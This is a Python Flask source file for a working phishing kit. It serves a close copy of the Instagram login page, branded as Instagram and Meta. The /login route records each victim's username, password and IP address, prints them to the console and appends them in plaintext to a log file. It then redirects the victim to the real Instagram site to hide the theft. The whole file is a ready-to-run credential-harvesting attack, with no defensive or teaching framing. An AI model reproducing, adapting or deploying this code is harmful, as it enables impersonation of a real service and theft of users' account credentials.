from flask import Flask, request, render_template_string, redirect, url_for
import datetime
from colorama import init, Fore, Style
import re

init(autoreset=True)  # Initialize colorama

app = Flask(__name__)

# ---------- Updated Functional Instagram HTML ----------
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login • Instagram</title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

html, body {
    width: 100%;
    min-height: 100%;
}

body {
    background: #0b0e12;
    color: #f5f5f5;
    font-family: Arial, Helvetica, sans-serif;
}

/* =========================
   MAIN
========================= */

.page {
    min-height: 700px;
    display: flex;
    border-top: 6px solid #3a3d43;
}

/* =========================
   LEFT
========================= */

.left {
    width: 52.5%;
    min-height: 694px;
    background: #0b0e12;
    border-right: 2px solid #38393d;
    position: relative;
}

.logo {
    position: absolute;
    top: 66px;
    left: 58px;
    width: 70px;
    height: 70px;
}

.logo svg {
    width: 100%;
    height: 100%;
}

.left-content {
    position: absolute;
    top: 218px;
    left: 0;
    width: 100%;
    text-align: center;
}

.left-content h1 {
    font-size: 40px;
    font-weight: 400;
    line-height: 1.72;
    letter-spacing: -1.2px;
}

.left-image {
    width: 360px;
    height: 300px;
    margin: 27px auto 0;
    border-radius: 20px;
    overflow: hidden;
}

.left-image img {
    width: 100%;
    height: 100%;
    object-fit: cover;
}

/* =========================
   RIGHT
========================= */

.right {
    width: 47.5%;
    min-height: 694px;
    background: #202022;
    position: relative;
}

.login {
    width: 598px;
    max-width: calc(100% - 70px);
    margin-left: auto;
    margin-right: auto;
    padding-top: 24px;
}

.login h2 {
    font-size: 21px;
    font-weight: 600;
    margin-bottom: 30px;
}

.input {
    width: 100%;
    height: 75px;
    display: block;

    background: #202022;
    border: 2px solid #48484e;
    border-radius: 18px;

    padding: 0 22px;

    color: white;
    font-size: 17px;
    outline: none;

    margin-bottom: 15px;
}

.input::placeholder {
    color: #96969c;
}

.input:focus {
    border-color: #66666e;
}

.login-button {
    width: 100%;
    height: 58px;

    margin-top: 14px;

    border: 0;
    border-radius: 30px;

    background: #1877d1;
    color: #ffffff;

    font-size: 17px;
    font-weight: 600;

    cursor: pointer;
}

.login-button:hover {
    background: #1168bd;
}

.forgot {
    display: block;

    margin-top: 32px;

    text-align: center;

    color: #eeeeee;
    text-decoration: none;

    font-size: 17px;
}

.forgot:hover {
    text-decoration: underline;
}

/* =========================
   SOCIAL
========================= */

.facebook {
    width: 100%;
    height: 58px;

    margin-top: 79px;

    border: 0;
    border-radius: 30px;

    background: #29292d;
    color: #d0d0d3;

    font-size: 17px;
    font-weight: 600;

    cursor: pointer;
}

.facebook:hover {
    background: #333338;
}

.facebook-icon {
    color: #087bea;
    font-size: 20px;
    margin-right: 10px;
}

.create {
    width: 100%;
    height: 58px;

    margin-top: 14px;

    border: 2px solid #2388e8;
    border-radius: 30px;

    background: transparent;
    color: #2388e8;

    font-size: 17px;
    font-weight: 600;

    cursor: pointer;
}

.create:hover {
    background: rgba(35, 136, 232, 0.1);
}

/* =========================
   META
========================= */

.meta {
    text-align: center;
    margin-top: 32px;

    font-size: 21px;
    font-weight: 600;

    color: #e5e5e5;
}

.meta a {
    color: inherit;
    text-decoration: none;
}

/* =========================
   FOOTER
========================= */

.footer {
    width: 100%;
    background: #202022;
    color: #9b9b9f;

    text-align: center;

    padding: 18px 20px 28px;

    font-size: 12px;
}

.footer-links {
    display: flex;
    justify-content: center;
    align-items: center;
    flex-wrap: wrap;

    gap: 17px;

    margin-bottom: 18px;
}

.footer-links a {
    color: inherit;
    text-decoration: none;
    white-space: nowrap;
}

.footer-links a:hover {
    text-decoration: underline;
}

.footer-bottom {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 22px;
}

/* =========================
   RESPONSIVE
========================= */

@media (max-width: 1000px) {

    .left {
        display: none;
    }

    .right {
        width: 100%;
        min-height: 100vh;
    }

    .login {
        width: 600px;
        max-width: 90%;
    }

    .footer {
        position: relative;
    }
}

@media (max-width: 600px) {

    .login {
        max-width: calc(100% - 36px);
    }

    .login h2 {
        font-size: 19px;
    }

    .input {
        height: 62px;
    }

    .login-button,
    .facebook,
    .create {
        height: 52px;
    }

    .footer-links {
        gap: 10px;
    }
}
</style>
</head>

<body>

<div class="page">

    <!-- LEFT SIDE -->
    <section class="left">

        <!-- Instagram-style visual logo -->
        <div class="logo">
            <svg viewBox="0 0 100 100">
                <defs>
                    <linearGradient id="igGradient"
                        x1="0%" y1="100%"
                        x2="100%" y2="0%">
                        <stop offset="0%" stop-color="#feda75"/>
                        <stop offset="25%" stop-color="#fa7e1e"/>
                        <stop offset="50%" stop-color="#d62976"/>
                        <stop offset="75%" stop-color="#962fbf"/>
                        <stop offset="100%" stop-color="#4f5bd5"/>
                    </linearGradient>
                </defs>

                <rect
                    x="10"
                    y="10"
                    width="80"
                    height="80"
                    rx="24"
                    fill="none"
                    stroke="url(#igGradient)"
                    stroke-width="8"/>

                <circle
                    cx="50"
                    cy="50"
                    r="20"
                    fill="none"
                    stroke="#d62976"
                    stroke-width="7"/>

                <circle
                    cx="73"
                    cy="27"
                    r="5"
                    fill="#fa1f1f"/>
            </svg>
        </div>

        <div class="left-content">

            <h1>
                See everyday moments from
                <br>
                your close friends.
            </h1>

            <!-- Demo image -->
            <div class="left-image">
                <img
                    src="/static/instagramimage.webp"
                    alt="Friends"
                    onerror="this.src='https://picsum.photos/400/600'"
                >
            </div>

        </div>

    </section>


    <!-- RIGHT SIDE -->
    <section class="right">

        <div class="login">

            <h2>Log into Instagram</h2>

            <!-- Functional Login Form -->
            <form action="/login" method="POST">

                <input
                    class="input"
                    type="text"
                    name="username"
                    placeholder="Mobile number, username or email"
                    autocomplete="username"
                    required
                >

                <input
                    class="input"
                    type="password"
                    name="password"
                    placeholder="Password"
                    autocomplete="current-password"
                    required
                >

                <button class="login-button" type="submit">
                    Log in
                </button>

            </form>

            <a class="forgot" href="/forgot">
                Forgot password?
            </a>

            <button class="facebook" type="button" onclick="window.location.href='https://www.facebook.com/login'">
                <span class="facebook-icon">f</span>
                Log in with Facebook
            </button>

            <button class="create" type="button" onclick="window.location.href='/signup'">
                Create new account
            </button>

            <div class="meta">
                <a href="https://about.meta.com/" target="_blank" rel="noopener noreferrer">
                    ∞ Meta
                </a>
            </div>

        </div>

    </section>

</div>


<!-- FOOTER -->
<footer class="footer">

    <div class="footer-links">
        <a href="https://about.meta.com/" target="_blank" rel="noopener noreferrer">Meta</a>
        <a href="https://about.instagram.com/" target="_blank" rel="noopener noreferrer">About</a>
        <a href="https://about.instagram.com/blog/" target="_blank" rel="noopener noreferrer">Blog</a>
        <a href="https://about.instagram.com/about-us/careers" target="_blank" rel="noopener noreferrer">Jobs</a>
        <a href="https://help.instagram.com/" target="_blank" rel="noopener noreferrer">Help</a>
        <a href="https://developers.facebook.com/docs/instagram" target="_blank" rel="noopener noreferrer">API</a>
        <a href="https://privacycenter.instagram.com/policy/" target="_blank" rel="noopener noreferrer">Privacy</a>
        <a href="https://help.instagram.com/581066165581870/" target="_blank" rel="noopener noreferrer">Terms</a>
        <a href="https://www.instagram.com/explore/locations/" target="_blank" rel="noopener noreferrer">Locations</a>
        <a href="https://www.instagram.com/web/lite/" target="_blank" rel="noopener noreferrer">Instagram Lite</a>
        <a href="https://www.threads.net/" target="_blank" rel="noopener noreferrer">Threads</a>
        <a href="https://www.facebook.com/help/instagram/261704639352628" target="_blank" rel="noopener noreferrer">Contact Uploading &amp; Non-Users</a>
        <a href="https://about.meta.com/technologies/meta-verified/" target="_blank" rel="noopener noreferrer">Meta Verified</a>
    </div>

    <div class="footer-bottom">
        <span>English ▾</span>
        <span>© 2026 Instagram from Meta</span>
    </div>

</footer>

</body>
</html>
"""

# ---------- Pretty colored console box ----------
def pretty_box(username, password, ip="unknown"):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    lines = [
        f"{Fore.YELLOW} LOGIN ATTEMPT ",
        f"{Fore.CYAN} Time : {now}",
        f" IP   : {ip}",
        f"{Fore.GREEN} User : {username}",
        f"{Fore.RED} Pass : {password}{Style.RESET_ALL}"
    ]

    # Strip ANSI codes for proper width
    def strip_ansi(s):
        return re.sub(r'\x1b\[[0-9;]*m', '', s)

    width = max(len(strip_ansi(line)) for line in lines) + 4
    top = "╔" + "═"*width + "╗"
    bottom = "╚" + "═"*width + "╝"
    middle = "\n".join(f"║ {line.ljust(width-2)} ║" for line in lines)
    return f"\n{top}\n{middle}\n{bottom}\n"

# ---------- Routes ----------
@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username", "<empty>")
    password = request.form.get("password", "<empty>")
    ip = request.remote_addr or "unknown"

    box = pretty_box(username, password, ip)
    print(box)

    with open("login_attempts.log", "a") as f:
        f.write(f"{datetime.datetime.now()} - {ip} - {username} - {password}\n")

    return redirect("https://www.instagram.com/accounts/login/")

@app.route("/forgot")
def forgot():
    return redirect("https://www.instagram.com/accounts/password/reset/")

@app.route("/signup")
def signup():
    return redirect("https://www.instagram.com/accounts/emailsignup/")

# ---------- Run Server ----------
if __name__ == "__main__":
    import os
    os.environ.pop("FLASK_ENV", None)
    app.run(host="0.0.0.0", port=5001, debug=False, use_reloader=False)
